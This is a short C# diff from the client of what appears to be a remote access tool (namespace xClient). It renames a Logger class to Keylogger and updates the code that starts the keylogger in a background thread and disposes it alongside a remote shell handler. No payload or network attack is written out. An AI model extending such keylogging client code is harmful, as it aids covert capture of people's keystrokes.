@@ -7,9 +7,9 @@ using xClient.Config;
 using xClient.Core;
 using xClient.Core.Commands;
 using xClient.Core.Helper;
-using xClient.Core.Keylogger;
 using xClient.Core.Networking;
 using xClient.Core.Packets;
+using xClient.Core.Utilities;
 
 namespace xClient
 {
@@ -41,8 +41,8 @@ namespace xClient
             CommandHandler.CloseShell();
             if (CommandHandler.StreamCodec != null)
                 CommandHandler.StreamCodec.Dispose();
-            if (Logger.Instance != null)
-                Logger.Instance.Dispose();
+            if (Keylogger.Instance != null)
+                Keylogger.Instance.Dispose();
             if (_msgLoop != null)
                 _msgLoop.ExitThread();
             if (_appMutex != null)
@@ -149,7 +149,7 @@ namespace xClient
                     new Thread(() =>
                     {
                         _msgLoop = new ApplicationContext();
-                        Logger logger = new Logger(15000);
+                        Keylogger logger = new Keylogger(15000);
                         Application.Run(_msgLoop);
                     }).Start(); ;
                 }
